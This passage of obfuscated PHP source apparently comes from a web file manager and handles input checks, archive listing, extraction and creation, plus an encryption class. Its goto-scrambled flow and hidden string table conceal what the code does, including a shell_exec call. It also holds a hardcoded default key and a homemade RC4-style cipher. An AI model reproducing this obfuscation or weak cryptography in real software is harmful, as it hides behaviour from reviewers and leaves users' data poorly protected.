"\x5b\x41\x2d\132\x61\55\x7a\60\x2d\x39\137\134\x2d\134\x2e\x5d\x2b", "\153\x65\x79\106\x75\x6c\x6c" => "\x5b\101\x2d\132\x61\x2d\x7a\60\55\x39\x5f\x5c\55\134\x2e\x5c\x73\54\x5d\x2b"); if (!$a„åÌâ”ä») { return $CÜòü≥Ñ®É; } return $CÜòü≥Ñ®É[$a„åÌâ”ä»]; } public static function check($Cªé¡âŒèå, $eèÁê©¶ÀÓ, $FÛáˆäœ√Ø = null) { $E⁄Öê±¬„à =& $_SERVER[—Ω]; switch ($eèÁê©¶ÀÓ) { case $E⁄Öê±¬„à[7]: return in_array($Cªé¡âŒèå, $FÛáˆäœ√Ø); break; case $E⁄Öê±¬„à[1858]: return floatval($Cªé¡âŒèå) > $FÛáˆäœ√Ø; break; case $E⁄Öê±¬„à[1859]: return floatval($Cªé¡âŒèå) < $FÛáˆäœ√Ø; break; case $E⁄Öê±¬„à[322]: return strlen($Cªé¡âŒèå) >= $FÛáˆäœ√Ø[0] && strlen($Cªé¡âŒèå) <= $FÛáˆäœ√Ø[1]; break; case $E⁄Öê±¬„à[322]: if (is_array($FÛáˆäœ√Ø)) { return strlen($Cªé¡âŒèå) >= $FÛáˆäœ√Ø[0] && strlen($Cªé¡âŒèå) <= $FÛáˆäœ√Ø[1]; break; } else { return strlen($Cªé¡âŒèå) == $FÛáˆäœ√Ø; break; } case $E⁄Öê±¬„à[318]: return floatval($Cªé¡âŒèå) >= $FÛáˆäœ√Ø[0] && floatval($Cªé¡âŒèå) <= $FÛáˆäœ√Ø[1]; break; } $B¬à∫ı©Ãú = self::reg(!1); $eèÁê©¶ÀÓ = isset($B¬à∫ı©Ãú[$eèÁê©¶ÀÓ]) ? $B¬à∫ı©Ãú[$eèÁê©¶ÀÓ] : $eèÁê©¶ÀÓ; if (substr($eèÁê©¶ÀÓ, 0, 1) != $E⁄Öê±¬„à[8]) { $eèÁê©¶ÀÓ = $E⁄Öê±¬„à[1860] . $eèÁê©¶ÀÓ . $E⁄Öê±¬„à[1861]; } return preg_match($eèÁê©¶ÀÓ, $Cªé¡âŒèå) === 1; } public static function get($CÙÂ∂’∫À°, $Cë“’Ÿ£÷à = null, $Fõ∂ﬂ¡÷óŒ = null, $e“ç«ƒÇª∏ = null) { goto EÙÑÉ›ï†Á; EÙÑÉ›ï†Á: $få‹π≈â¿å =& $_SERVER[—Ω]; $DıÒ‰ôô∂‹ = array(); if (!is_null($Fõ∂ﬂ¡÷óŒ)) { $DıÒ‰ôô∂‹[$få‹π≈â¿å[34]] = $Fõ∂ﬂ¡÷óŒ; } goto fΩ√û≥î≥Ú; DÑ—¢‹—ﬂå: return $Dì⁄ÀÈ°ùû[$CÙÂ∂’∫À°]; goto CéÙÖñù⁄; fΩ√û≥î≥Ú: if (!is_null($e“ç«ƒÇª∏)) { $DıÒ‰ôô∂‹[$få‹π≈â¿å[1015]] = $e“ç«ƒÇª∏; } if (!is_null($Cë“’Ÿ£÷à)) { $DıÒ‰ôô∂‹[$få‹π≈â¿å[1856]] = $Cë“’Ÿ£÷à; } $Dì⁄ÀÈ°ùû = Input::getArray(array($CÙÂ∂’∫À° => $DıÒ‰ôô∂‹)); goto DÑ—¢‹—ﬂå; CéÙÖñù⁄: } } class KodArchive { static function init() { goto B¨íí´ø£Ü; Bö—‡ì±±•: require_once ARCHIVE_LIB . $CﬁÆ≠•Êô≤[1873]; goto C⁄ê∫úï€Ç; CŒú·ôë¬ì: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $CﬁÆ≠•Êô≤[1868]; require_once ARCHIVE_LIB . $CﬁÆ≠•Êô≤[1869]; goto c∆ÉÇÃ∆‚á; c∆ÉÇÃ∆‚á: require_once ARCHIVE_LIB . $CﬁÆ≠•Êô≤[1870]; require_once ARCHIVE_LIB . $CﬁÆ≠•Êô≤[1871]; require_once ARCHIVE_LIB . $CﬁÆ≠•Êô≤[1872]; goto Bö—‡ì±±•; B¨íí´ø£Ü: $CﬁÆ≠•Êô≤ =& $_SERVER[—Ω]; if (defined($CﬁÆ≠•Êô≤[1862])) { return; } define($CﬁÆ≠•Êô≤[1862], SDK_DIR . $CﬁÆ≠•Êô≤[1863]); goto d∫¿ﬂâûÁœ; d∫¿ﬂâûÁœ: define($CﬁÆ≠•Êô≤[1864], TEMP_FILES); define($CﬁÆ≠•Êô≤[1865], TEMP_FILES); define($CﬁÆ≠•Êô≤[1866], $CﬁÆ≠•Êô≤[1867]); goto CŒú·ôë¬ì; C⁄ê∫úï€Ç: } static function checkIfType($EÎÀË”¿î≈, $a¬™‡ëÒ≈ö) { goto eëÜ‰¬ø÷Ω; eëÜ‰¬ø÷Ω: $eÏÏÊÇ¢¢π =& $_SERVER[—Ω]; self::init(); $C¡úñË„·ÿ = array($eÏÏÊÇ¢¢π[298] => array($eÏÏÊÇ¢¢π[298], $eÏÏÊÇ¢¢π[1874], $eÏÏÊÇ¢¢π[1875], $eÏÏÊÇ¢¢π[1876]), $eÏÏÊÇ¢¢π[1877] => array($eÏÏÊÇ¢¢π[1877], $eÏÏÊÇ¢¢π[1878], $eÏÏÊÇ¢¢π[1047], $eÏÏÊÇ¢¢π[1045]), $eÏÏÊÇ¢¢π[1049] => array($eÏÏÊÇ¢¢π[1049], $eÏÏÊÇ¢¢π[1879], $eÏÏÊÇ¢¢π[1880], $eÏÏÊÇ¢¢π[1881], $eÏÏÊÇ¢¢π[1882], $eÏÏÊÇ¢¢π[1883], $eÏÏÊÇ¢¢π[1884])); goto fïª”Âç÷ ; fïª”Âç÷ : $Dƒ≠Ú◊•éÃ = in_array($EÎÀË”¿î≈, $C¡úñË„·ÿ[$a¬™‡ëÒ≈ö]); if ($Dƒ≠Ú◊•éÃ && ($a¬™‡ëÒ≈ö == $eÏÏÊÇ¢¢π[298] || $a¬™‡ëÒ≈ö == $eÏÏÊÇ¢¢π[1877]) && (!function_exists($eÏÏÊÇ¢¢π[1885]) || !function_exists($eÏÏÊÇ¢¢π[1886]))) { show_tips($eÏÏÊÇ¢¢π[1887]); } if ($Dƒ≠Ú◊•éÃ && $a¬™‡ëÒ≈ö == $eÏÏÊÇ¢¢π[1049] && (!function_exists($eÏÏÊÇ¢¢π[1888]) || !strstr(shell_exec($eÏÏÊÇ¢¢π[1889]), $eÏÏÊÇ¢¢π[1890]))) { show_tips($eÏÏÊÇ¢¢π[1891]); } goto AˆÕáÑ‹»ì; AˆÕáÑ‹»ì: return $Dƒ≠Ú◊•éÃ; goto CÖœ‡ﬁıÑú; CÖœ‡ﬁıÑú: } static function listContent($Bù⁄¬ôñüì, $DÜÈë¿çµá = true) { $F∞ﬁÙ¥º„› =& $_SERVER[—Ω]; self::init(); $DÛàì˜’Ñ∆ = !empty($GLOBALS[$F∞ﬁÙ¥º„›[1053]]) ? $GLOBALS[$F∞ﬁÙ¥º„›[1053]] : get_path_ext($Bù⁄¬ôñüì); $D•¥≠⁄ÈŸ¢ = !1; if (self::checkIfType($DÛàì˜’Ñ∆, $F∞ﬁÙ¥º„›[1877])) { $CÆùæÖüı≤ = PclTarList($Bù⁄¬ôñüì, $DÛàì˜’Ñ∆); $D•¥≠⁄ÈŸ¢ = array(); for ($dÂ¡åÒ™€à = 0; $dÂ¡åÒ™€à < count($CÆùæÖüı≤); $dÂ¡åÒ™€à++) { $AÊÃöÒ∫⁄Ω = $CÆùæÖüı≤[$dÂ¡åÒ™€à]; if ($AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[1892]] == $F∞ﬁÙ¥º„›[1893] || $AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[1892]] == $F∞ﬁÙ¥º„›[1894]) { continue; } if ($DÜÈë¿çµá) { $AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[1895]] = ltrim($AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[1895]], $F∞ﬁÙ¥º„›[1151]); } if ($AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[1892]] == $F∞ﬁÙ¥º„›[1896]) { $AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[76]] = !0; } else { $AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[76]] = !1; } $AÊÃöÒ∫⁄Ω[$F∞ﬁÙ¥º„›[1040]] = $dÂ¡åÒ™€à; $D•¥≠⁄ÈŸ¢[] = $AÊÃöÒ∫⁄Ω; } } else { if (self::checkIfType($DÛàì˜’Ñ∆, $F∞ﬁÙ¥º„›[1049])) { $E®êﬁ◊“µ = kodRarArchive::listContent($Bù⁄¬ôñüì); if (!$E®êﬁ◊“µ[$F∞ﬁÙ¥º„›[1036]]) { return $E®êﬁ◊“µ; } else { $D•¥≠⁄ÈŸ¢ = $E®êﬁ◊“µ[$F∞ﬁÙ¥º„›[1038]]; } } else { if (kodZipArchive::support($F∞ﬁÙ¥º„›[351])) { $D•¥≠⁄ÈŸ¢ = kodZipArchive::listContent($Bù⁄¬ôñüì); } else { $a‡Á√ïçùÃ = new PclZip($Bù⁄¬ôñüì); $D•¥≠⁄ÈŸ¢ = $a‡Á√ïçùÃ->listContent(); } } } if ($D•¥≠⁄ÈŸ¢) { $DÀô≥√¡Ü = unzip_charset_get($D•¥≠⁄ÈŸ¢); $DÜÈë¿çµá = $DÜÈë¿çµá && function_exists($F∞ﬁÙ¥º„›[65]); for ($dÂ¡åÒ™€à = 0; $dÂ¡åÒ™€à < count($D•¥≠⁄ÈŸ¢); $dÂ¡åÒ™€à++) { $D•¥≠⁄ÈŸ¢[$dÂ¡åÒ™€à][$F∞ﬁÙ¥º„›[1895]] = str_replace(array($F∞ﬁÙ¥º„›[1076], $F∞ﬁÙ¥º„›[1897]), $F∞ﬁÙ¥º„›[772], $D•¥≠⁄ÈŸ¢[$dÂ¡åÒ™€à][$F∞ﬁÙ¥º„›[1895]]); if ($DÜÈë¿çµá) { $D•¥≠⁄ÈŸ¢[$dÂ¡åÒ™€à][$F∞ﬁÙ¥º„›[1895]] = iconv_to($D•¥≠⁄ÈŸ¢[$dÂ¡åÒ™€à][$F∞ﬁÙ¥º„›[1895]], $DÀô≥√¡Ü, $F∞ﬁÙ¥º„›[323]); unset($D•¥≠⁄ÈŸ¢[$dÂ¡åÒ™€à][$F∞ﬁÙ¥º„›[1898]]); } } return array($F∞ﬁÙ¥º„›[1036] => !0, $F∞ﬁÙ¥º„›[1038] => $D•¥≠⁄ÈŸ¢); } else { return array($F∞ﬁÙ¥º„›[1036] => !1, $F∞ﬁÙ¥º„›[1038] => $D•¥≠⁄ÈŸ¢); } } static function extract($DÂåˆ¥èë¬, $EêÁ∫Ï›„«, $Fû…çÍ÷´Õ = "\55\x31", &$cÚú∆´‡˘è = false) { goto d ûÈè¨¡Ñ; f±æŒÚéØâ: $C¶ÌÀœúƒÃ = self::listContent($DÂåˆ¥èë¬, !1); if (!$C¶ÌÀœúƒÃ[$f∑Ò–†∏ùû[1036]]) { return $C¶ÌÀœúƒÃ; } if ($Fû…çÍ÷´Õ != $f∑Ò–†∏ùû[1035]) { goto AÖ∞ÿ´®Æ≥; AÖ∞ÿ´®Æ≥: $Eÿ÷ï’©›∫ = self::fileIndex($C¶ÌÀœúƒÃ[$f∑Ò–†∏ùû[1038]], $Fû…çÍ÷´Õ); $cÚú∆´‡˘è = str_replace(array($f∑Ò–†∏ùû[1076], $f∑Ò–†∏ùû[1897]), $f∑Ò–†∏ùû[70], $Eÿ÷ï’©›∫[$f∑Ò–†∏ùû[1895]]); $DÕ≠·‡Ç ≥ = $cÚú∆´‡˘è; goto b¿ËÙ∫Ò è; b¿ËÙ∫Ò è: if ($GLOBALS[$f∑Ò–†∏ùû[6]][$f∑Ò–†∏ùû[1149]] != $f∑Ò–†∏ùû[323]) { $DÕ≠·‡Ç ≥ = unzip_pre_name($cÚú∆´‡˘è); } $dÀ”ÑåÜãÜ = get_path_father($cÚú∆´‡˘è); if ($dÀ”ÑåÜãÜ == $cÚú∆´‡˘è) { $dÀ”ÑåÜãÜ = $f∑Ò–†∏ùû[33]; } goto E¯µ—‰…ëÇ; E¯µ—‰…ëÇ: if ($Eÿ÷ï’©›∫[$f∑Ò–†∏ùû[76]]) { $DÕ≠·‡Ç ≥ = rtrim($DÕ≠·‡Ç ≥, $f∑Ò–†∏ùû[8]) . $f∑Ò–†∏ùû[8]; $cÚú∆´‡˘è = array($cÚú∆´‡˘è); } $dﬁªÏü…πê = str_replace($f∑Ò–†∏ùû[95], $f∑Ò–†∏ùû[8], $DÕ≠·‡Ç ≥); if (substr($dﬁªÏü…πê, -1) == $f∑Ò–†∏ùû[8]) { if (!strstr(trim($dﬁªÏü…πê, $f∑Ò–†∏ùû[8]), $f∑Ò–†∏ùû[8])) { $EêÁ∫Ï›„« = $EêÁ∫Ï›„« . get_path_this($dﬁªÏü…πê) . $f∑Ò–†∏ùû[8]; } } else { if ($dÀ”ÑåÜãÜ == $DÕ≠·‡Ç ≥) { $dÀ”ÑåÜãÜ = $f∑Ò–†∏ùû[33]; } } goto cá¥„àÓƒø; cá¥„àÓƒø: } goto D”≈âãÁ∂; D”≈âãÁ∂: if (self::checkIfType($e˘˜≈ñ–Ãü, $f∑Ò–†∏ùû[1877])) { if ($Fû…çÍ÷´Õ != $f∑Ò–†∏ùû[1035]) { $DÕ≠·‡Ç ≥ = unzip_pre_name($DÕ≠·‡Ç ≥); $dÀ”ÑåÜãÜ = unzip_pre_name($dÀ”ÑåÜãÜ); $FàÕÿ¯øº¢ = PclTarExtractList($DÂåˆ¥èë¬, array($DÕ≠·‡Ç ≥), $EêÁ∫Ï›„«, $dÀ”ÑåÜãÜ, $e˘˜≈ñ–Ãü); } else { $FàÕÿ¯øº¢ = PclTarExtract($DÂåˆ¥èë¬, $EêÁ∫Ï›„«, $f∑Ò–†∏ùû[358], $e˘˜≈ñ–Ãü); } return array($f∑Ò–†∏ùû[1036] => $FàÕÿ¯øº¢, $f∑Ò–†∏ùû[1038] => PclErrorString(!0)); } else { if (self::checkIfType($e˘˜≈ñ–Ãü, $f∑Ò–†∏ùû[1049])) { return kodRarArchive::extract($DÂåˆ¥èë¬, $EêÁ∫Ï›„«, $e˘˜≈ñ–Ãü, $cÚú∆´‡˘è); } else { if (kodZipArchive::support($f∑Ò–†∏ùû[1899])) { return kodZipArchive::extract($DÂåˆ¥èë¬, $EêÁ∫Ï›„«, $cÚú∆´‡˘è); } else { $Fåô”≥≥ë‰ = new PclZip($DÂåˆ¥èë¬); if ($Fû…çÍ÷´Õ != $f∑Ò–†∏ùû[1035]) { $FàÕÿ¯øº¢ = $Fåô”≥≥ë‰->extract(PCLZIP_OPT_PATH, $EêÁ∫Ï›„«, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $f∑Ò–†∏ùû[1900], PCLZIP_OPT_BY_NAME, $Eÿ÷ï’©›∫[$f∑Ò–†∏ùû[1895]], PCLZIP_OPT_REMOVE_PATH, $dÀ”ÑåÜãÜ, PCLZIP_OPT_REPLACE_NEWER); } else { $FàÕÿ¯øº¢ = $Fåô”≥≥ë‰->extract(PCLZIP_OPT_PATH, $EêÁ∫Ï›„«, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $f∑Ò–†∏ùû[1900], PCLZIP_OPT_REPLACE_NEWER); } return array($f∑Ò–†∏ùû[1036] => $FàÕÿ¯øº¢, $f∑Ò–†∏ùû[1038] => $Fåô”≥≥ë‰->errorName(!0)); } } } return array($f∑Ò–†∏ùû[1036] => !1, $f∑Ò–†∏ùû[1038] => $f∑Ò–†∏ùû[1901]); goto A…Úô›ûÁ¨; d ûÈè¨¡Ñ: $f∑Ò–†∏ùû =& $_SERVER[—Ω]; self::init(); $e˘˜≈ñ–Ãü = !empty($GLOBALS[$f∑Ò–†∏ùû[1053]]) ? $GLOBALS[$f∑Ò–†∏ùû[1053]] : get_path_ext($DÂåˆ¥èë¬); goto f±æŒÚéØâ; A…Úô›ûÁ¨: } static function fileIndex($CÖ–ÌÆÙ‹‡, $cßû‰™¥Àç, $F¢ªÙ√∆åñ = false) { goto e›€—°ÜÂ∂; Cﬁå«—û⁄•: $EôàÜﬂ»œˆ = count($CÖ–ÌÆÙ‹‡); for ($F¯ß∑£ÔÇÜ = 0; $F¯ß∑£ÔÇÜ < $EôàÜﬂ»œˆ; $F¯ß∑£ÔÇÜ++) { if ($cßû‰™¥Àç == $CÖ–ÌÆÙ‹‡[$F¯ß∑£ÔÇÜ][$AÉèµíÛœ¿[1040]]) { $c≥¥Ãîàä‘ = $CÖ–ÌÆÙ‹‡[$F¯ß∑£ÔÇÜ]; break; } } if (!$c≥¥Ãîàä‘) { show_tips($AÉèµíÛœ¿[1902]); } goto A„‘∞Îﬁ†€; e›€—°ÜÂ∂: $AÉèµíÛœ¿ =& $_SERVER[—Ω]; self::init(); if (!is_array($CÖ–ÌÆÙ‹‡)) { return !1; } goto Cﬁå«—û⁄•; A„‘∞Îﬁ†€: $b∆ÖÃÿÖÿ = $c≥¥Ãîàä‘; if ($F¢ªÙ√∆åñ) { $b∆ÖÃÿÖÿ = $c≥¥Ãîàä‘[$F¢ªÙ√∆åñ]; if ($c≥¥Ãîàä‘[$AÉèµíÛœ¿[76]]) { $b∆ÖÃÿÖÿ = rtrim($b∆ÖÃÿÖÿ, $AÉèµíÛœ¿[8]) . $AÉèµíÛœ¿[8]; } } return $b∆ÖÃÿÖÿ; goto D∆¥√®ó—±; D∆¥√®ó—±: } static function extractZipFile($BÕ∑°√åÈ“, $F·ÇÒÈ¨ÿ∂, $E•«˘ê∂…ú = false) { goto bùÆÓëÍ©‰; d∆ëÕû¡»î: $EŒÚ¡÷÷Ÿ≥ = get_path_father($F·ÇÒÈ¨ÿ∂); if ($EŒÚ¡÷÷Ÿ≥ == $F·ÇÒÈ¨ÿ∂) { $EŒÚ¡÷÷Ÿ≥ = $aÚæ•∂Ûı[33]; } $dÀ—ÿ«Û˜‹ = $E‹≠¬Âä∂◊->extract(PCLZIP_OPT_PATH, $AÍÑí…Êâ˜, PCLZIP_CB_PRE_FILE_NAME, $aÚæ•∂Ûı[1900], PCLZIP_OPT_REMOVE_PATH, $EŒÚ¡÷÷Ÿ≥, PCLZIP_OPT_BY_NAME, $F·ÇÒÈ¨ÿ∂); goto cœ–◊Œòî»; cœ–◊Œòî»: if (!file_exists($bÀÉ è®Ê‚)) { return !1; } @rename($bÀÉ è®Ê‚, $CãÆÚßùïà); return $CãÆÚßùïà; goto CÁñ”ÎÁéá; Bä•ÂŒè¶Ò: if (file_exists($CãÆÚßùïà)) { return $CãÆÚßùïà; } $E‹≠¬Âä∂◊ = new PclZip($BÕ∑°√åÈ“); $bÀÉ è®Ê‚ = unzip_filter_ext($AÍÑí…Êâ˜ . get_path_this($F·ÇÒÈ¨ÿ∂)); goto d∆ëÕû¡»î; bùÆÓëÍ©‰: $aÚæ•∂Ûı =& $_SERVER[—Ω]; self::init(); $AÍÑí…Êâ˜ = TEMP_FILES . hash_path($BÕ∑°√åÈ“) . $aÚæ•∂Ûı[8]; goto eèóﬂ„ÃèÆ; eèóﬂ„ÃèÆ: mk_dir($AÍÑí…Êâ˜); $CãÆÚßùïà = $AÍÑí…Êâ˜ . md5($BÕ∑°√åÈ“ . $F·ÇÒÈ¨ÿ∂); if ($E•«˘ê∂…ú) { $CãÆÚßùïà = $AÍÑí…Êâ˜ . $E•«˘ê∂…ú; } goto Bä•ÂŒè¶Ò; CÁñ”ÎÁéá: } static function filePreview($BçéÃ≠∆ë, $Dá®ôßá‚¶, $d·úÈÁæÜ‰ = false, $B ∫Â¶‹œƒ = false) { goto fß˜ü∆†§Ï; f¢çŸùúÖÔ: mk_dir($BÒ¿≥éÈü”); $FÔ´ÖﬂÜﬂÒ = $BÒ¿≥éÈü” . md5($BçéÃ≠∆ë . $Dá®ôßá‚¶ . $B ∫Â¶‹œƒ); $EßÎËÉ‡ëΩ = $bªÓë∑ªöÛ[33]; goto aÔã∂Úﬁõ; CÇÈìö€ùﬁ: if (!$a‘Ø„«≥”∏[$bªÓë∑ªöÛ[1036]]) { show_json($a‘Ø„«≥”∏[$bªÓë∑ªöÛ[1038]], !1); } if (!file_exists($fø‚üÜ⁄èë)) { show_json($bªÓë∑ªöÛ[1904], !1); } @rename($fø‚üÜ⁄èë, $FÔ´ÖﬂÜﬂÒ); goto B›√Â»€€˘; aÔã∂Úﬁõ: $a‘Ø„«≥”∏ = self::extract($BçéÃ≠∆ë, $BÒ¿≥éÈü”, $Dá®ôßá‚¶, $EßÎËÉ‡ëΩ); if (is_array($EßÎËÉ‡ëΩ)) { show_json($bªÓë∑ªöÛ[1903], !1); } if (file_exists($FÔ´ÖﬂÜﬂÒ)) { IO::fileOut($FÔ´ÖﬂÜﬂÒ, $d·úÈÁæÜ‰, get_path_this($EßÎËÉ‡ëΩ)); return; } goto f¨©≤Ω‚ìÀ; f¨©≤Ω‚ìÀ: $EßÎËÉ‡ëΩ = unzip_pre_name($EßÎËÉ‡ëΩ); $fÙ®◊äÔÉÕ = get_path_this($EßÎËÉ‡ëΩ); $fø‚üÜ⁄èë = unzip_filter_ext($BÒ¿≥éÈü” . $fÙ®◊äÔÉÕ); goto CÇÈìö€ùﬁ; B›√Â»€€˘: if (!file_exists($FÔ´ÖﬂÜﬂÒ)) { del_dir($BÒ¿≥éÈü”); show_json($bªÓë∑ªöÛ[1905]); } IO::fileOut($FÔ´ÖﬂÜﬂÒ, $d·úÈÁæÜ‰, $fÙ®◊äÔÉÕ); goto EŒï˘Ù¶Úä; fß˜ü∆†§Ï: $bªÓë∑ªöÛ =& $_SERVER[—Ω]; self::init(); $BÒ¿≥éÈü” = TEMP_FILES . hash_path($BçéÃ≠∆ë) . $bªÓë∑ªöÛ[8]; goto f¢çŸùúÖÔ; EŒï˘Ù¶Úä: } static function create($dÓéì˜Û∑í, $Cõì£∞øâÒ) { $AΩ¬ä∂” Ü =& $_SERVER[—Ω]; self::init(); $c„âêè¡èâ = get_path_ext($dÓéì˜Û∑í); $B†ôÇ«Öë≈ = !1; if (self::checkIfType($c„âêè¡èâ, $AΩ¬ä∂” Ü[298])) { if (kodZipArchive::support($AΩ¬ä∂” Ü[1014])) { return kodZipArchive::create($dÓéì˜Û∑í, $Cõì£∞øâÒ); } $b≠˘—§Ò®Ã = new PclZip($dÓéì˜Û∑í); foreach ($Cõì£∞øâÒ as $Aÿ´‚’Ω÷∑ => $f≥€ë≈äãç) { $f≥€ë≈äãç = str_replace($AΩ¬ä∂” Ü[463], $AΩ¬ä∂” Ü[8], $f≥€ë≈äãç); $C‡·Ï‚–¥‰ = Kodio::clear(get_path_father($f≥€ë≈äãç)); if ($Aÿ´‚’Ω÷∑ == 0) { $B†ôÇ«Öë≈ = $b≠˘—§Ò®Ã->create($f≥€ë≈äãç, PCLZIP_OPT_REMOVE_PATH, $C‡·Ï‚–¥‰, PCLZIP_CB_PRE_FILE_NAME, $AΩ¬ä∂” Ü[1906]); continue; } $B†ôÇ«Öë≈ = $b≠˘—§Ò®Ã->add($f≥€ë≈äãç, PCLZIP_OPT_REMOVE_PATH, $C‡·Ï‚–¥‰, PCLZIP_CB_PRE_FILE_NAME, $AΩ¬ä∂” Ü[1906]); } } else { if (self::checkIfType($c„âêè¡èâ, $AΩ¬ä∂” Ü[1877])) { foreach ($Cõì£∞øâÒ as $Aÿ´‚’Ω÷∑ => $f≥€ë≈äãç) { $f≥€ë≈äãç = str_replace($AΩ¬ä∂” Ü[463], $AΩ¬ä∂” Ü[8], $f≥€ë≈äãç); $C‡·Ï‚–¥‰ = Kodio::clear(get_path_father($f≥€ë≈äãç)); if ($Aÿ´‚’Ω÷∑ == 0) { $B†ôÇ«Öë≈ = PclTarCreate($dÓéì˜Û∑í, array($f≥€ë≈äãç), $c„âêè¡èâ, null, $C‡·Ï‚–¥‰); continue; } $B†ôÇ«Öë≈ = PclTarAddList($dÓéì˜Û∑í, array($f≥€ë≈äãç), $AΩ¬ä∂” Ü[33], $C‡·Ï‚–¥‰, $c„âêè¡èâ); } } } return $B†ôÇ«Öë≈; } } class Mcrypt { public static $defaultKey = "\x61\x21\x74\141\153\x41\72\x64\154\155\x63\154\144\105\x76\54\145"; public static function encode($a¿Í√Ú˜Ôî, $B§˘Ì‡‡Â˜ = '', $Féíåºèù› = 0, $Cà€»äè«£ = '') { goto cπÆèãË¥†; cπÆèãË¥†: $fÙû§ÉÿÊπ =& $_SERVER[—Ω]; $Fä‚çÛ’Ô± = 4; $B§˘Ì‡‡Â˜ = md5($B§˘Ì‡‡Â˜ ? $B§˘Ì‡‡Â˜ : self::$defaultKey); goto fìãñﬁ’Ü‡; FÀ®ÑŸîÎ¨: $b»éë•Öàê = substr($Cà€»äè«£, -$Fä‚çÛ’Ô±); $bÙà≈⁄±¢â = $bÖÙ†„á◊ì . md5($bÖÙ†„á◊ì . $b»éë•Öàê); $dΩ≈™¯ §› = strlen($bÙà≈⁄±¢â); goto a¿¢–éó¶À; EåÙè´ƒ´Ç: $cËå¯àù±∂ = $fÙû§ÉÿÊπ[33]; for ($aÇπû‘≥∏ˆ = $B˘„…¨ˆéÕ = $Aâ†¯≈ëö– = 0; $Aâ†¯≈ëö– < $e£ÇÚ©Ø»á; $Aâ†¯≈ëö–++) { $aÇπû‘≥∏ˆ = ($aÇπû‘≥∏ˆ + 1) % 256; $B˘„…¨ˆéÕ = ($B˘„…¨ˆéÕ + $B„á—Úó†ç[$aÇπû‘≥∏ˆ]) % 256; $c‡´Æ∑ûìì = $B„á—Úó†ç[$aÇπû‘≥∏ˆ]; $B„á—Úó†ç[$aÇπû‘≥∏ˆ] = $B„á—Úó†ç[$B˘„…¨ˆéÕ]; $B„á—Úó†ç[$B˘„…¨ˆéÕ] = $c‡´Æ∑ûìì; $cËå¯àù±∂ .= chr(ord($a¿Í√Ú˜Ôî[$Aâ†¯≈ëö–]) ^ $B„á—Úó†ç[($B„á—Úó†ç[$aÇπû‘≥∏ˆ] + $B„á—Úó†ç[$B˘„…¨ˆéÕ]) % 256]); } $cËå¯àù±∂ = $b»éë•Öàê . str_replace($fÙû§ÉÿÊπ[913], $fÙû§ÉÿÊπ[33], base64_encode($cËå¯àù±∂)); goto d∑⁄‘å∆Ç©; a¿¢–éó¶À: $a¿Í√Ú˜Ôî = sprintf($fÙû§ÉÿÊπ[1907], $Féíåºèù› ? $Féíåºèù› + time() : 0) . substr(md5($a¿Í√Ú˜Ôî . $díáﬂàπ’‚), 0, 16) . $a¿Í√Ú˜Ôî; $e£ÇÚ©Ø»á = strlen($a¿Í√Ú˜Ôî); $C¢õ÷©Ôâë = array(); goto a¢Ó‰¨ÒÊ¬; fìãñﬁ’Ü‡: $bÖÙ†„á◊ì = md5(substr($B§˘Ì‡‡Â˜, 0, 16)); $díáﬂàπ’‚ = md5(substr($B§˘Ì‡‡Â˜, 16, 16)); $Cà€»äè«£ = $Cà€»äè«£ ? $Cà€»äè«£ : md5(microtime()); goto FÀ®ÑŸîÎ¨; d∑⁄‘å∆Ç©: $cËå¯àù±∂ = str_replace(array($fÙû§ÉÿÊπ[281], $fÙû§ÉÿÊπ[8], $fÙû§ÉÿÊπ[913]), array($fÙû§ÉÿÊπ[408], $fÙû§ÉÿÊπ[70], $fÙû§ÉÿÊπ[93]), $cËå¯àù±∂); return $cËå¯àù±∂; goto BéÁÔµ©Í÷; a¢Ó‰¨ÒÊ¬: for ($Aâ†¯≈ëö– = 0; $Aâ†¯≈ëö– <= 255; $Aâ†¯≈ëö–++) { $C¢õ÷©Ôâë[$Aâ†¯≈ëö–] = ord($bÙà≈⁄±¢â[$Aâ†¯≈ëö– % $dΩ≈™¯ §›]); } $B„á—Úó†ç = range(0, 255); for ($B˘„…¨ˆéÕ = $Aâ†¯≈ëö– = 0; $Aâ†¯≈ëö– < 256; $Aâ†¯≈ëö–++) { $B˘„…¨ˆéÕ = ($B˘„…¨ˆéÕ + $B„á—Úó†ç[$Aâ†¯≈ëö–] + $C¢õ÷©Ôâë[$Aâ†¯≈ëö–]) % 256; $c‡´Æ∑ûìì = $B„á—Úó†ç[$Aâ†¯≈ëö–]; $B„á—Úó†ç[$Aâ†¯≈ëö–] = $B„á—Úó†ç[$B˘„…¨ˆéÕ]; $B„á—Úó†ç[$B˘„…¨ˆéÕ] = $c‡´Æ∑ûìì; } goto EåÙè´ƒ´Ç; BéÁÔµ©Í÷: } public static function decode($F°∂ö¿¨øç, $BΩæ€ú∑–ñ = '') { goto d“˘√öß™Õ; a¯’Àé¿òí: if (($eÙã÷Î≠ñÆ == 0 || $eÙã÷Î≠ñÆ - time() > 0) && substr($d≠ñŒÉ âﬁ, 10, 16) == substr(md5(substr($d≠ñŒÉ âﬁ, 26) . $Aáº’ÈÚ…î), 0, 16)) { return substr($d≠ñŒÉ âﬁ, 26); } else { return $Cã–Ωç€‡£[33]; } goto DÚµ¬»Ç£∞; d£ôé¨‰™§: $d≠ñŒÉ âﬁ = $Cã–Ωç€‡£[33]; for ($B…ãéÇêª“ = $Få¶£Í∆˘∑ = $dÕ öﬂ…¶æ = 0; $dÕ öﬂ…¶æ < $cﬂÙ’‚ìöâ; $dÕ öﬂ…¶æ++) { $B…ãéÇêª“ = ($B…ãéÇêª“ + 1) % 256; $Få¶£Í∆˘∑ = ($Få¶£Í∆˘∑ + $aÍƒßñ÷ïä[$B…ãéÇêª“]) % 256; $fÙà”¨ëŒµ = $aÍƒßñ÷ïä[$B…ãéÇêª“]; $aÍƒßñ÷ïä[$B…ãéÇêª“] = $aÍƒßñ÷ïä[$Få¶£Í∆˘∑]; 